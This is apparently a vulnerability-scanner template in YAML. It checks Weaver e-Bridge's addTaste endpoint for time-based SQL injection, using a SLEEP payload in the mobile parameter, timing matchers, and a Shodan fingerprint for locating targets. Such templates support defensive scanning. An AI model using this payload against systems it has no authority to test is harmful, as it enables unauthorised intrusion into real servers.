id: poc-yaml-weaver-e-bridge-addtaste-sqli
info:
  name: 泛微云桥 e-Bridge addTaste接口SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: weaver-ebridge
    shodan: app="泛微-云桥e-Bridge"

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        GET /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{t1}})))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "systemname"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
